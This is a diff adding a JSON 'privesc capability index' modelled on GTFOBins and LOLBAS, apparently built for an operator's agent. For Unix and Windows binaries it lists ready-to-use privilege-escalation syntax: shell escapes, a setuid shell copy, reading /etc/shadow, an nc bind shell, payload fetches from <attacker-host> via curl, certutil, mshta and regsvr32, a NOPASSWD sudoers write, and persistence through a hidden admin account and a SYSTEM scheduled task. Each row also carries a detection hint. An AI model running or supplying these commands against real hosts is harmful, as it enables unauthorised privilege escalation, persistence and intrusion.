@@ -1,0 +1,342 @@
+{
+ "capability_vocab": [
+  "shell",
+  "sudo",
+  "suid",
+  "file-read",
+  "file-write",
+  "file-download",
+  "dir-list",
+  "bind-listener",
+  "process-spawn",
+  "compile",
+  "persistence"
+ ],
+ "meta": {
+  "generated": "2026-10-05",
+  "name": "privesc capability index (KA-031)",
+  "policy": "structure inspired by GTFOBins + LOLBAS conventions; command SYNTAX only - no shellcode, no encoded payloads, no exploit code; every planned command passes the host agent's execution gates + a human review before use",
+  "sources": "gtfobins.github.io / lolbas-project.github.io convention shapes, re-authored in-house from operator knowledge; the index = the starter rows; grow via the regen builder",
+  "totals": {
+   "platforms": 2,
+   "rows": 29
+  }
+ },
+ "platforms": {
+  "unix": [
+   {
+    "binary": "awk",
+    "capabilities": [
+     "shell",
+     "sudo"
+    ],
+    "detection": "execve monitoring; awk spawned shells",
+    "syntax": [
+     "awk 'BEGIN {system(\"/bin/sh\")}'"
+    ]
+   },
+   {
+    "binary": "bash",
+    "capabilities": [
+     "shell",
+     "sudo"
+    ],
+    "detection": "execve audit; shell-spawn from setuid context",
+    "syntax": [
+     "bash"
+    ]
+   },
+   {
+    "binary": "cp",
+    "capabilities": [
+     "suid",
+     "file-write"
+    ],
+    "detection": "setuid bit creation on copied binaries",
+    "syntax": [
+     "cp /bin/sh /tmp/sh && chmod +s /tmp/sh"
+    ]
+   },
+   {
+    "binary": "curl",
+    "capabilities": [
+     "file-download"
+    ],
+    "detection": "outbound fetches from service contexts",
+    "syntax": [
+     "curl http://<attacker-host>/tool.sh -o /tmp/tool.sh"
+    ]
+   },
+   {
+    "binary": "env",
+    "capabilities": [
+     "shell",
+     "sudo"
+    ],
+    "detection": "env executing shell paths",
+    "syntax": [
+     "env /bin/sh"
+    ]
+   },
+   {
+    "binary": "find",
+    "capabilities": [
+     "shell",
+     "sudo"
+    ],
+    "detection": "find with -exec to shells",
+    "syntax": [
+     "find . -exec /bin/sh \\;"
+    ]
+   },
+   {
+    "binary": "gdb",
+    "capabilities": [
+     "shell",
+     "sudo"
+    ],
+    "detection": "gdb shell escapes",
+    "syntax": [
+     "gdb -nx -ex '!sh' -ex quit"
+    ]
+   },
+   {
+    "binary": "less",
+    "capabilities": [
+     "file-read",
+     "shell"
+    ],
+    "detection": "less reading protected files; shell escape via pager",
+    "syntax": [
+     "less /etc/shadow",
+     "!sh"
+    ]
+   },
+   {
+    "binary": "man",
+    "capabilities": [
+     "file-read",
+     "shell"
+    ],
+    "detection": "pager escapes under sudo",
+    "syntax": [
+     "man man",
+     "!sh"
+    ]
+   },
+   {
+    "binary": "nc",
+    "capabilities": [
+     "bind-listener",
+     "process-spawn"
+    ],
+    "detection": "nc listener spawning shells",
+    "syntax": [
+     "nc -lvnp 4444 -e /bin/sh"
+    ]
+   },
+   {
+    "binary": "openssl",
+    "capabilities": [
+     "bind-listener"
+    ],
+    "detection": "openssl listeners outside approved services",
+    "syntax": [
+     "openssl s_server -quiet -p 4444"
+    ]
+   },
+   {
+    "binary": "perl",
+    "capabilities": [
+     "shell",
+     "sudo"
+    ],
+    "detection": "perl one-liners spawning shells",
+    "syntax": [
+     "perl -e 'exec \"/bin/sh\"'"
+    ]
+   },
+   {
+    "binary": "python3",
+    "capabilities": [
+     "shell",
+     "sudo"
+    ],
+    "detection": "python pty spawns; unexpected python on hosts",
+    "syntax": [
+     "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'"
+    ]
+   },
+   {
+    "binary": "systemctl",
+    "capabilities": [
+     "file-write",
+     "sudo"
+    ],
+    "detection": "unit-file edits outside change windows",
+    "syntax": [
+     "sudo systemctl edit <unit>"
+    ]
+   },
+   {
+    "binary": "tar",
+    "capabilities": [
+     "shell",
+     "sudo"
+    ],
+    "detection": "tar checkpoint exec actions",
+    "syntax": [
+     "tar cf out.tar x --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+    ]
+   },
+   {
+    "binary": "tee",
+    "capabilities": [
+     "file-write",
+     "sudo"
+    ],
+    "detection": "any write to /etc/sudoers*; tee writing system configs",
+    "syntax": [
+     "echo 'ka ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/ka"
+    ]
+   },
+   {
+    "binary": "vim",
+    "capabilities": [
+     "shell",
+     "sudo",
+     "file-read"
+    ],
+    "detection": "vim editing protected files; shell escapes",
+    "syntax": [
+     "vim -c ':!sh'",
+     "vim /etc/shadow"
+    ]
+   },
+   {
+    "binary": "wget",
+    "capabilities": [
+     "file-download"
+    ],
+    "detection": "wget in unusual parent processes",
+    "syntax": [
+     "wget http://<attacker-host>/tool.sh -O /tmp/tool.sh"
+    ]
+   }
+  ],
+  "windows": [
+   {
+    "binary": "certutil.exe",
+    "capabilities": [
+     "file-download"
+    ],
+    "detection": "certutil urlcache = classic fetch",
+    "syntax": [
+     "certutil.exe -urlcache -split -f http://<attacker-host>/tool.exe tool.exe"
+    ]
+   },
+   {
+    "binary": "csc.exe",
+    "capabilities": [
+     "compile"
+    ],
+    "detection": "csc outside dev hosts",
+    "syntax": [
+     "csc.exe -out:tool.exe tool.cs"
+    ]
+   },
+   {
+    "binary": "installutil.exe",
+    "capabilities": [
+     "process-spawn"
+    ],
+    "detection": "installutil exec paths",
+    "syntax": [
+     "installutil.exe /u tool.exe"
+    ]
+   },
+   {
+    "binary": "msbuild.exe",
+    "capabilities": [
+     "compile"
+    ],
+    "detection": "msbuild outside dev windows",
+    "syntax": [
+     "msbuild.exe build.proj"
+    ]
+   },
+   {
+    "binary": "mshta",
+    "capabilities": [
+     "process-spawn"
+    ],
+    "detection": "mshta spawning from remote urls",
+    "syntax": [
+     "mshta http://<attacker-host>/app.hta"
+    ]
+   },
+   {
+    "binary": "net.exe",
+    "capabilities": [
+     "persistence"
+    ],
+    "detection": "local account creation + admin group joins",
+    "syntax": [
+     "net user ka Pass1234! /add; net localgroup administrators ka /add"
+    ]
+   },
+   {
+    "binary": "powershell",
+    "capabilities": [
+     "shell",
+     "file-download"
+    ],
+    "detection": "-ep bypass invocations; script-block logging",
+    "syntax": [
+     "powershell -nop -ep bypass -c <command>"
+    ]
+   },
+   {
+    "binary": "regsvr32",
+    "capabilities": [
+     "process-spawn",
+     "file-download"
+    ],
+    "detection": "regsvr32 with remote sct",
+    "syntax": [
+     "regsvr32 /s /n /u /i:http://<attacker-host>/x.sct scrobj.dll"
+    ]
+   },
+   {
+    "binary": "rundll32",
+    "capabilities": [
+     "process-spawn"
+    ],
+    "detection": "rundll32 executing arbitrary cmds",
+    "syntax": [
+     "rundll32 shell32.dll,ShellExec_RunDLL <cmd>"
+    ]
+   },
+   {
+    "binary": "schtasks.exe",
+    "capabilities": [
+     "persistence"
+    ],
+    "detection": "schtasks creation as SYSTEM outside change windows",
+    "syntax": [
+     "schtasks /create /tn KA /tr <cmd> /sc onstart /ru SYSTEM"
+    ]
+   },
+   {
+    "binary": "wmic.exe",
+    "capabilities": [
+     "process-spawn"
+    ],
+    "detection": "remote/local wmic exec; often over admin shares",
+    "syntax": [
+     "wmic process call create <cmd>"
+    ]
+   }
+  ]
+ }
+}
